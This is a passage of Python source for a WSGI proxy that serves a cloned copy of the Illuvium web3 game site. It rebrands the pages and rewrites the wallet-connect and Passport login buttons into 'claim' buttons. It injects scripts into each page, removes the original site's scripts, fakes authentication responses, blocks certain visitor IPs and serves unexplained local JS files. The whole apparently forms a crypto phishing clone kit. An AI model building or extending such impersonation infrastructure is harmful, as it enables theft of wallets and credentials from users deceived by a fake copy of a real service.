    def modify_html_text(self, content):
        """Replace specific text content in HTML elements."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
            
        # Common text replacements
        replacements = {
            # Button text replacements
            'Log In with Passport': 'Custom Login',
            'Connect Wallet': 'Custom Wallet',
            'Play Now': 'Play Game',
            'Launch Game': 'Start Game',
            'Claim': 'Get Reward',
            'Redeem': 'Get Item',
            
            # Header/title replacements
            'Illuvium | Overworld': 'Game Portal',
            'Overworld': 'Game World',
            
            # Content text replacements
            'survive the Overworld': 'explore the Game World',
            'teeming with Illuvials': 'filled with creatures',
            
            # Footer text replacements
            '© 2023 Illuvium. All Rights Reserved': '© 2025 Game Portal. All Rights Reserved',
        }
        
        # Apply all text replacements
        for original, replacement in replacements.items():
            content = content.replace(original, replacement)
        
        # Use regex for more targeted replacements with HTML context
        
        # Replace text in specific button elements
        content = re.sub(
            r'(<button[^>]*class="[^"]*play[^"]*"[^>]*>)(.*?)(</button>)',
            r'\1Play Game\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace text in specific header elements
        content = re.sub(
            r'(<h1[^>]*>)(.*?Illuvium.*?)(</h1>)',
            r'\1Game Portal\3', 
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace text in paragraphs containing specific keywords
        content = re.sub(
            r'(<p[^>]*>)(.*?passport.*?)(</p>)',
            r'\1Login with your custom account\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace modal dialog text
        content = re.sub(
            r'(class="[^"]*modal-title[^"]*"[^>]*>)(.*?)(</)',
            r'\1Custom Action\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Add JavaScript to dynamically modify text that might be added after page load
        dynamic_text_script = '''
        <script>
        // Run when DOM is loaded and then periodically
        function updateDynamicText() {
            // Text replacement map
            const textMap = {
                'Log In with Passport': 'Custom Login',
                'Connect Wallet': 'Custom Wallet',
                'Play Now': 'Play Game',
                'Launch Game': 'Start Game',
                'Claim': 'Get Reward',
                'Redeem': 'Get Item',
                'Illuvium | Overworld': 'Game Portal',
                'Overworld': 'Game World'
            };
            
            // Function to replace text in an element and its children
            function replaceTextInNode(node) {
                if (node.nodeType === 3) { // Text node
                    let text = node.nodeValue;
                    let changed = false;
                    
                    // Apply all replacements
                    for (const [original, replacement] of Object.entries(textMap)) {
                        if (text.includes(original)) {
                            text = text.replace(new RegExp(original, 'g'), replacement);
                            changed = true;
                        }
                    }
                    
                    // Only update if changed
                    if (changed) {
                        node.nodeValue = text;
                    }
                } else if (node.nodeType === 1) { // Element node
                    // Skip script and style elements
                    if (node.tagName !== 'SCRIPT' && node.tagName !== 'STYLE') {
                        // Process children
                        Array.from(node.childNodes).forEach(replaceTextInNode);
                    }
                }
            }
            
            // Start at body
            replaceTextInNode(document.body);
            
            // Also update page title
            if (document.title.includes('Illuvium')) {
                document.title = 'Game Portal';
            }
        }
        
        // Run immediately after page load
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', updateDynamicText);
        } else {
            updateDynamicText();
        }
        
        // Then run periodically to catch dynamic content
        setInterval(updateDynamicText, 1000);
        </script>
        '''
        
        # Insert the script before the closing body tag
        if '</body>' in content:
            content = content.replace('</body>', f'{dynamic_text_script}</body>')
        
        return content.encode('utf-8')

    def modify_html_content(self, content):
        """Main function to modify HTML content with all transformations."""
        if isinstance(content, bytes):
            content_str = content.decode('utf-8', errors='ignore')
        else:
            content_str = content
            
        logger.info(f"[{self.session_id}] Starting HTML content modifications")
        
        try:
            # Step 1: Find and fix the syntax error at line ~11978
            lines = content_str.split('\n')
            for i in range(max(0, min(12100, len(lines) - 1) - 200), min(12100, len(lines) - 1)):
                if ':' in lines[i] and '{' not in lines[i] and '}' not in lines[i] and ';' not in lines[i]:
                    # This might be the problematic line with standalone colon
                    logger.info(f"Potential syntax issue found at line {i+1}: {lines[i]}")
                    # Replace standalone colons with semicolons
                    lines[i] = re.sub(r'([^:]):([^:=])', r'\1;\2', lines[i])
            
            content_str = '\n'.join(lines)
            
            # Step 2: Remove the problematic script
            content_str = re.sub(
                r'<script[^>]*>\s*function connection_all\(\)\s*{[^<]*</script>',
                '',
                content_str
            )
            
            # Step 3: Direct replacement of button texts with enhanced logging
            text_replacements = {
                'Play for Free': 'Start Game',
                'Log In with Passport': 'Custom Login',
                'Connect Wallet': 'Custom Connect',
                'Play Now': 'Start Game',
                'Launch Game': 'Start Game'
            }
            
            for original, replacement in text_replacements.items():
                # Log before replacement
                matches = re.findall(f'<button[^>]*>\\s*{re.escape(original)}\\s*</button>', content_str)
                if matches:
                    logger.info(f"[{self.session_id}] Found {len(matches)} buttons with text '{original}'")
                    for match in matches:
                        logger.info(f"[{self.session_id}] Button HTML before change: {match}")
                
                # Apply replacement
                content_str = re.sub(
                    f'<button[^>]*>\\s*{re.escape(original)}\\s*</button>',
                    f'<button class="claim-button">\\g<0></button>'.replace(original, replacement),
                    content_str
                )
                
                # Log after replacement
                matches = re.findall(f'<button[^>]*>\\s*{replacement}\\s*</button>', content_str)
                if matches:
                    logger.info(f"[{self.session_id}] Found {len(matches)} buttons with new text '{replacement}'")
                    for match in matches:
                        logger.info(f"[{self.session_id}] Button HTML after change: {match}")
            
            # Step 4: Add our text replacement script with improved logging
            if '</body>' in content_str:
                content_str = content_str.replace('</body>', '''
                    <script>
                        // Wait for DOM to be fully loaded
                        document.addEventListener('DOMContentLoaded', function() {
                            console.log('DOM Content Loaded - Starting text modifications');
                            
                            // Text replacements to apply
                            const textMap = {
                                'Play for Free': 'Start Game',
                                'Play Now': 'Start Game',
                                'Log In with Passport': 'Custom Login',
                                'Connect Wallet': 'Custom Connect',
                                'Launch Game': 'Start Game'
                            };
                            
                            // Function to log text changes
                            function logTextChange(element, oldText, newText) {
                                console.log('Text changed:', {
                                    element: element.outerHTML,
                                    oldText: oldText,
                                    newText: newText,
                                    timestamp: new Date().toISOString()
                                });
                            }
                            
                            // Apply text replacements to all buttons
                            document.querySelectorAll('button').forEach(function(button) {
                                const text = button.textContent.trim();
                                if (textMap[text]) {
                                    const oldText = text;
                                    button.textContent = textMap[text];
                                    button.classList.add('claim-button');
                                    logTextChange(button, oldText, textMap[text]);
                                }
                            });
                            
                            console.log('Text modifications applied successfully');
                            
                            // Periodically check for new buttons
                            setInterval(function() {
                                document.querySelectorAll('button:not(.claim-button)').forEach(function(button) {
                                    const text = button.textContent.trim();
                                    if (textMap[text]) {
                                        const oldText = text;
                                        button.textContent = textMap[text];
                                        button.classList.add('claim-button');
                                        logTextChange(button, oldText, textMap[text]);
                                    }
                                });
                            }, 1000); // Check every second
                        });
                    </script>
                    </body>''')
            
            return content_str.encode('utf-8')
        except Exception as e:
            logger.error(f"Error modifying HTML content: {str(e)}")
            logger.error(traceback.format_exc())
            return content.encode('utf-8') if isinstance(content, str) else content

    def check_local_file(self, path):
        """
        Check if a file exists locally in the Assets directory.
        
        Args:
            path: The requested path
            
        Returns:
            tuple: (bool, str) - (exists, full_path)
        """
        # Remove leading slash and proxy prefix if present
        clean_path = path.lstrip('/')
        if clean_path.startswith('proxy/'):
            clean_path = clean_path[6:]
        
        # Construct full path
        full_path = os.path.join(self.directory, clean_path)
        
        # Check if file exists
        exists = os.path.exists(full_path) and os.path.isfile(full_path)
        logger.debug(f"Local file check for {path}: exists={exists}, full_path={full_path}")
        return exists, full_path

    def handle_request(self, environ, start_response):
        try:
            # Log request
            self.debugger.log_request(environ)
            
            # Get request path and query
            path = environ.get('PATH_INFO', '')
            query = environ.get('QUERY_STRING', '')
            
            logger.info(f"[{self.session_id}] Handling request for path: {path}")
            
            # Skip IP validation for assets and static files
            skip_ip_validation = any(path.endswith(ext) for ext in [
                '.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.webp', 
                '.woff', '.woff2', '.ttf', '.eot', '.otf', '.ico', '.json'
            ]) or path.startswith(('/_next/static/', '/static/', '/assets/', '/images/'))
            
            # Only validate IP for HTML content and API requests
            if not skip_ip_validation:
                client_ip = get_client_ip_wsgi(environ)
                if validate_ip(client_ip, self.original_site):
                    logger.warning(f"Access denied for IP: {client_ip}")
                    start_response('403 Forbidden', [('Content-Type', 'text/plain')])
                    return [b'Access denied']
            
            # Skip modifying React framework files
            skip_modification = False
            if any(x in path for x in [
                'framework-', 'main-', 'webpack-', 'pages/_app-', 'pages/index-',
                'reactPlayerFilePlayer', '/_buildManifest', '/_ssgManifest'
            ]):
                logger.info(f"[{self.session_id}] Skipping modification for framework file: {path}")
                skip_modification = True
            
            # Check if file exists locally
            exists, local_path = self.check_local_file(path)
            if exists:
                try:
                    with open(local_path, 'rb') as f:
                        content = f.read()
                    start_response('200 OK', [('Content-Type', self.get_content_type(path))])
                    return [content]
                except Exception as e:
                    logger.error(f"[{self.session_id}] Error reading local file: {str(e)}")
                    self.debugger.log_request(environ, error=e)
                    start_response('500 Internal Server Error', [])
                    return [b'Error reading local file']
            
            # Proxy request to original site
            url = f"{self.original_site}{path}"
            if query:
                url += f"?{query}"
            
            logger.info(f"[{self.session_id}] Proxying request to: {url}")
            
            headers = self.get_headers(environ)
            method = environ.get('REQUEST_METHOD', 'GET')
            
            try:
                if method == 'GET':
                    response = self.session.get(url, headers=headers, stream=True)
                elif method == 'POST':
                    content_length = int(environ.get('CONTENT_LENGTH', 0))
                    body = environ['wsgi.input'].read(content_length) if content_length > 0 else None
                    response = self.session.post(url, headers=headers, data=body, stream=True)
                else:
                    start_response('405 Method Not Allowed', [])
                    return [b'Method not allowed']
                
                # Log response
                self.debugger.log_request(environ, response=response)
                
                # Process response based on content type and path
                content_type = response.headers.get('Content-Type', '')
                content = response.content
                
                # If we're skipping modification, return content unmodified
                if skip_modification:
                    # Set response headers
                    response_headers = []
                    for k, v in response.headers.items():
                        if k.lower() not in ['content-length', 'content-encoding']:
                            response_headers.append((k, v))
                    
                    # Add Content-Length header
                    response_headers.append(('Content-Length', str(len(content))))
                    
                    # Add CORS headers to all responses
                    response_headers.extend([
                        ('Access-Control-Allow-Origin', '*'),
                        ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
                        ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
                    ])
                    
                    start_response(f"{response.status_code} {response.reason}", response_headers)
                    return [content]
                
                # Handle JavaScript chunks
                if path.startswith('/_next/static/chunks/') and 'application/javascript' in content_type:
                    logger.info(f"[{self.session_id}] Processing JavaScript chunk: {path}")
                    
                    # Skip modification for all framework and critical chunks
                    if any(x in path for x in [
                        'framework-', 'main-', 'webpack-', 'pages/_app-', 'pages/index-', 
                        'reactPlayerFilePlayer', '/_buildManifest', '/_ssgManifest'
                    ]):
                        logger.info(f"[{self.session_id}] Skipping framework chunk: {path}")
                        headers = [
                            ('Content-Type', 'application/javascript'),
                            ('Content-Length', str(len(content))),
                            ('Access-Control-Allow-Origin', '*'),
                            ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
                            ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
                        ]
                        start_response(f"{response.status_code} {response.reason}", headers)
                        return [content]
                    
                    # For other JS chunks, apply simple text replacements
                    try:
                        # Only do simple text replacements to avoid syntax errors
                        content_str = content.decode('utf-8', errors='ignore')
                        
                        # Safe replacements that won't break JS syntax
                        replacements = {
                            '"Play for Free"': '"Start Game"',
                            "'Play for Free'": "'Start Game'",
                            '"Log In with Passport"': '"Custom Login"',
                            "'Log In with Passport'": "'Custom Login'",
                            '"Connect Wallet"': '"Custom Connect"',
                            "'Connect Wallet'": "'Custom Connect'",
                            '"Play Now"': '"Start Game"',
                            "'Play Now'": "'Start Game'",
                            
                            # URL replacements
                            'store.epicgames.com/en-US/p/illuvium-60064c': 'localhost:8000/play',
                            'com.epicgames.launcher://store/product/illuvium-60064c': 'javascript:void(0)',
                            'https://store.epicgames.com/en-US/p/illuvium-60064c': 'javascript:void(0)'
                        }
                        
                        # Apply replacements
                        for original, replacement in replacements.items():
                            if original in content_str:
                                logger.info(f"[{self.session_id}] Replacing '{original}' with '{replacement}' in JS")
                                content_str = content_str.replace(original, replacement)
                        
                        content = content_str.encode('utf-8')
                    except Exception as e:
                        logger.error(f"[{self.session_id}] Error modifying JS chunk: {str(e)}")
                        # Return original content if modification fails
                        content = response.content
                
                # Handle HTML content
                elif 'text/html' in content_type:
                    logger.info(f"[{self.session_id}] Processing HTML content")
                    
                    try:
                        # Apply HTML content modifications
                        content = self.modify_html_content(content)
                    except Exception as e:
                        logger.error(f"[{self.session_id}] Error processing HTML: {str(e)}")
                        content = response.content  # Use original content on error
                
                # Handle CSS content
                elif 'text/css' in content_type:
                    logger.info(f"[{self.session_id}] Processing CSS content")
                    content = self.rewrite_urls(content)
                
                # Set response headers
                response_headers = []
                for k, v in response.headers.items():
                    if k.lower() not in ['content-length', 'content-encoding']:
                        response_headers.append((k, v))
                
                # Add Content-Length header
                response_headers.append(('Content-Length', str(len(content))))
                
                # Add CORS headers to all responses
                response_headers.extend([
                    ('Access-Control-Allow-Origin', '*'),
                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
                ])
                
                start_response(f"{response.status_code} {response.reason}", response_headers)
                return [content]
                
            except Exception as e:
                logger.error(f"[{self.session_id}] Error processing request: {str(e)}")
                logger.error(traceback.format_exc())
                self.debugger.log_request(environ, error=e)
                start_response('500 Internal Server Error', [])
                return [b'Error processing request']
                
        except Exception as e:
            logger.error(f"[{self.session_id}] Server error: {str(e)}")
            logger.error(traceback.format_exc())
            self.debugger.log_request(environ, error=e)
            start_response('500 Internal Server Error', [])
            return [b'Server error']

    def get_headers(self, environ):
        """Extract headers from WSGI environ."""
        headers = {}
        for key, value in environ.items():
            if key.startswith('HTTP_'):
                header_name = key[5:].replace('_', '-').title()
                headers[header_name] = value
        return headers

    def handle_autodrone(self, environ, start_response):
        """Special handler for autodrone.html requests"""
        try:
            # Get the absolute path of the current directory
            current_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(current_dir, 'App_files', 'Assets', 'autodrone-a197980a86d93925.js')
            logger.info(f"Looking for file at path: {file_path}")
            
            # Check if we have a local copy first
            if os.path.exists(file_path):
                logger.info(f"File exists at: {file_path}")
                with open(file_path, 'rb') as f:
                    content = f.read()
                    
                # Process the content
                try:
                    content_str = content.decode('utf-8', errors='ignore')
                    content_str = self.rewrite_urls(content_str)
                    content = content_str.encode('utf-8')
                except Exception as e:
                    logger.error(f"Error processing content: {str(e)}")
                    # If processing fails, use original content
                    pass
                    
                start_response('200 OK', [
                    ('Content-Type', 'application/javascript'),
                    ('Access-Control-Allow-Origin', '*'),
                    ('Cache-Control', 'no-cache'),
                    ('Content-Length', str(len(content)))
                ])
                return [content]
            else:
                logger.error(f"File not found at: {file_path}")
                # Try alternate path
                alt_path = os.path.join(os.getcwd(), 'App_files', 'Assets', 'autodrone-a197980a86d93925.js')
                logger.info(f"Trying alternate path: {alt_path}")
                if os.path.exists(alt_path):
                    logger.info(f"File exists at alternate path: {alt_path}")
                    with open(alt_path, 'rb') as f:
                        content = f.read()
                        
                    # Process the content
                    try:
                        content_str = content.decode('utf-8', errors='ignore')
                        content_str = self.rewrite_urls(content_str)
                        content = content_str.encode('utf-8')
                    except Exception as e:
                        logger.error(f"Error processing content: {str(e)}")
                        # If processing fails, use original content
                        pass
                        
                    start_response('200 OK', [
                        ('Content-Type', 'application/javascript'),
                        ('Access-Control-Allow-Origin', '*'),
                        ('Cache-Control', 'no-cache'),
                        ('Content-Length', str(len(content)))
                    ])
                    return [content]
                else:
                    logger.error(f"File not found at alternate path: {alt_path}")
            
            # If we get here, we couldn't find the file locally
            start_response('404 Not Found', [
                ('Content-Type', 'text/plain'),
                ('Access-Control-Allow-Origin', '*')
            ])
            return [b'File not found']
                    
        except Exception as e:
            logger.error(f"Error in handle_autodrone: {str(e)}")
            logger.error(traceback.format_exc())
            
            # Return 500 if something unexpected happened
            start_response('500 Internal Server Error', [
                ('Content-Type', 'text/plain'),
                ('Access-Control-Allow-Origin', '*')
            ])
            return [b'Error serving autodrone-a197980a86d93925.js']

    def __call__(self, environ, start_response):
        try:
            # Get request method and path
            method = environ.get('REQUEST_METHOD', '')
            path = environ.get('PATH_INFO', '/')
            
            logger.info(f"Handling request: {method} {path}")
            
            # Handle favicon.ico requests
            if path == '/favicon.ico':
                start_response('204 No Content', [])
                return [b'']
            
            # Handle autodrone requests
            if path in ['/autodrone', '/autodrone.html', '/proxy/autodrone', '/proxy/autodrone.html']:
                logger.info("Handling autodrone request")
                # Try to serve the JS file directly
                try:
                    # Use absolute path
                    file_path = '/Users/home/Desktop/wget/Alex/App_files/Assets/autodrone-a197980a86d93925.js'
                    logger.info(f"Looking for file at: {file_path}")
                    
                    if os.path.exists(file_path):
                        logger.info(f"Found autodrone file at: {file_path}")
                        with open(file_path, 'rb') as f:
                            content = f.read()
                        start_response('200 OK', [
                            ('Content-Type', 'application/javascript'),
                            ('Access-Control-Allow-Origin', '*'),
                            ('Cache-Control', 'no-cache'),
                            ('Content-Length', str(len(content)))
                        ])
                        return [content]
                    else:
                        logger.error(f"Autodrone file not found at: {file_path}")
                except Exception as e:
                    logger.error(f"Error serving autodrone file: {str(e)}")
                    logger.error(traceback.format_exc())
                
                # If we get here, something went wrong
                start_response('404 Not Found', [
                    ('Content-Type', 'text/plain'),
                    ('Access-Control-Allow-Origin', '*')
                ])
                return [b'File not found']
            
            # Handle OPTIONS requests (CORS preflight)
            if method == 'OPTIONS':
                start_response('200 OK', [
                    ('Access-Control-Allow-Origin', '*'),
                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization'),
                    ('Access-Control-Max-Age', '86400')  # 24 hours
                ])
                return [b'']
            
            # Handle authentication requests
            if '/api/auth/' in path or '/api/user/' in path:
                # Return a mock successful authentication response
                mock_response = {
                    "success": True,
                    "user": {
                        "id": "mock-user-123",
                        "username": "mock_user",
                        "email": "mock@example.com",
                        "isAuthenticated": True,
                        "token": "mock-token-xyz"
                    }
                }
                
                start_response('200 OK', [
                    ('Content-Type', 'application/json'),
                    ('Access-Control-Allow-Origin', '*'),
                    ('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'),
                    ('Access-Control-Allow-Headers', 'Content-Type, Authorization')
                ])
                
                return [json.dumps(mock_response).encode('utf-8')]
            
            # Handle S3 image requests
            if 'web-illuvium-static.s3.us-east-2.amazonaws.com' in path:
                # Extract the actual S3 URL
                s3_url_match = re.search(r'/(https?:\/\/[^/]+\/.*)', path)
                if s3_url_match:
                    s3_url = s3_url_match.group(1)
                    # Fix double semicolons if present
                    s3_url = s3_url.replace(';//', '://')
                    
                    try:
                        # Fetch the image from S3
                        response = requests.get(s3_url, stream=True)
                        if response.status_code == 200:
                            # Determine content type
                            content_type = response.headers.get('Content-Type', 'image/svg+xml')
                            
                            # Set response headers
                            headers = [
                                ('Content-Type', content_type),
                                ('Cache-Control', 'public, max-age=31536000'),
                                ('Access-Control-Allow-Origin', '*')
                            ]
                            
                            start_response('200 OK', headers)
                            return [response.content]
                    except Exception as e:
                        logger.error(f"Error fetching S3 image: {str(e)}")
                
                # If we get here, something went wrong
                start_response('404 Not Found', [('Content-Type', 'text/plain')])
                return [b'Image not found']
                
            # Handle root path
            if path == '/':
                with open('index.html', 'rb') as f:
                    content = f.read()
                content = self.modify_html_content(content)
                start_response('200 OK', [('Content-Type', 'text/html')])
                return [content]
            
            # Handle specific JS files
            if path == '/settings.js':
                try:
                    with open('settings.js', 'rb') as f:
                        content = f.read()
                    start_response('200 OK', [('Content-Type', 'application/javascript')])
                    return [content]
                except FileNotFoundError:
                    start_response('404 Not Found', [('Content-Type', 'text/plain')])
                    return [b'File not found']
            
            if path == '/qf1qoqnpzht.js':
                try:
                    with open('qf1qoqnpzht.js', 'rb') as f:
                        content = f.read()
                    start_response('200 OK', [('Content-Type', 'application/javascript')])
                    return [content]
                except FileNotFoundError:
                    start_response('404 Not Found', [('Content-Type', 'text/plain')])
                    return [b'File not found']
            
            # Handle _next directory requests
            if path.startswith('/_next/'):
                # For Next.js image optimization API
                if path.startswith('/_next/image'):
                    # Get query string from environ
                    query_string = environ.get('QUERY_STRING', '')
                    # Parse query parameters
                    query_params = parse_qs(query_string)
                    
                    # Get the image URL and decode it
                    if 'url' in query_params:
                        image_url = query_params['url'][0]
                        # URL decode the image path
                        decoded_url = urllib.parse.unquote(image_url)
                        
                        # Check if we have the image cached locally
                        cache_path = os.path.join(self.directory, 'cache', decoded_url.lstrip('/'))
                        os.makedirs(os.path.dirname(cache_path), exist_ok=True)
                        
                        if os.path.exists(cache_path):
                            # Serve from cache
                            with open(cache_path, 'rb') as f:
                                content = f.read()
                            content_type = mimetypes.guess_type(cache_path)[0] or 'image/webp'
                            headers = [
                                ('Content-Type', content_type),
                                ('Cache-Control', 'public, max-age=31536000'),
                                ('Access-Control-Allow-Origin', '*')
                            ]
                            start_response('200 OK', headers)
                            return [content]
                        
                        # If not in cache, fetch from original site
                        try:
                            # Construct the full URL with query parameters
                            proxy_url = f"{ORIGINAL_SITE}{decoded_url}"
                            
                            # Fetch the image with proper headers
                            headers = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            }
                            response = requests.get(proxy_url, headers=headers, stream=True)
                            
                            if response.status_code == 200:
                                # Cache the image
                                with open(cache_path, 'wb') as f:
                                    for chunk in response.iter_content(chunk_size=8192):
                                        if chunk:
                                            f.write(chunk)
                                
                                # Get content type from response or guess from URL
                                content_type = response.headers.get('Content-Type')
                                if not content_type:
                                    content_type = mimetypes.guess_type(decoded_url)[0] or 'image/webp'
                                
                                # Set response headers
                                headers = [
                                    ('Content-Type', content_type),
                                    ('Cache-Control', 'public, max-age=31536000'),
                                    ('Access-Control-Allow-Origin', '*')
                                ]
                                start_response('200 OK', headers)
                                
                                # Stream the response content
                                def generate():
                                    for chunk in response.iter_content(chunk_size=8192):
                                        if chunk:
                                            yield chunk
                                return generate()
                            else:
                                start_response('404 Not Found', [('Content-Type', 'text/plain')])
                                return [b'Image not found']
                        except Exception as e:
                            logger.error(f"Error fetching image: {str(e)}")
                            start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
                            return [b'Error fetching image']
                    else:
                        start_response('400 Bad Request', [('Content-Type', 'text/plain')])
                        return [b'Missing image URL parameter']
                
                # Handle other _next/ requests
                next_path = path[6:]  # Remove /_next/ prefix
                file_path = os.path.join(self.directory, '_next', next_path)
                
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        content = f.read()
                else:
                    # If file doesn't exist locally, proxy from original site
                    proxy_url = f"{ORIGINAL_SITE}{path}"
                    response = requests.get(proxy_url)
                    content = response.content
                
                # Determine content type based on file extension
                if file_path.endswith('.js'):
                    content_type = 'application/javascript'
                elif file_path.endswith('.css'):
                    content_type = 'text/css'
                elif file_path.endswith('.webp'):
                    content_type = 'image/webp'
                elif file_path.endswith('.svg'):
                    content_type = 'image/svg+xml'
                else:
                    content_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
                
                # Add CORS headers for SVG files
                headers = [('Content-Type', content_type)]
                if path.endswith('.svg'):
                    headers.extend([
                        ('Access-Control-Allow-Origin', '*'),
                        ('Cache-Control', 'public, max-age=31536000')
                    ])
                
                start_response('200 OK', headers)
                return [content]
            
            # All other requests go through handle_request
            return self.handle_request(environ, start_response)
                
        except Exception as e:
            logger.error(f"Error handling request: {str(e)}")
            logger.error(traceback.format_exc())
            start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
            return [b'Internal Server Error']

    def get_content_type(self, path):
        """Determine the content type based on file extension."""
        # Get the file extension
        ext = os.path.splitext(path)[1].lower()
        
        # Map of common extensions to content types
        content_types = {
            '.html': 'text/html',
            '.htm': 'text/html',
            '.js': 'application/javascript',
            '.css': 'text/css',
            '.json': 'application/json',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.svg': 'image/svg+xml',
            '.webp': 'image/webp',
            '.ico': 'image/x-icon',
            '.woff': 'font/woff',
            '.woff2': 'font/woff2',
            '.ttf': 'font/ttf',
            '.eot': 'application/vnd.ms-fontobject',
            '.otf': 'font/otf',
            '.txt': 'text/plain',
            '.xml': 'application/xml',
            '.pdf': 'application/pdf',
            '.zip': 'application/zip',
            '.gz': 'application/gzip',
            '.tar': 'application/x-tar',
            '.mp3': 'audio/mpeg',
            '.mp4': 'video/mp4',
            '.webm': 'video/webm',
            '.ogg': 'audio/ogg',
            '.wav': 'audio/wav'
        }
        
        # Return the content type or default to application/octet-stream
        return content_types.get(ext, 'application/octet-stream')

# Create an instance of the WSGIHandler
application = WSGIHandler()

# For local testing with the built-in server
if __name__ == "__main__":
    from wsgiref.simple_server import make_server
    port = int(os.environ.get("PORT", 8000))
    httpd = make_server('', port, application)
    print(f"Serving on port {port}...")
    httpd.serve_forever()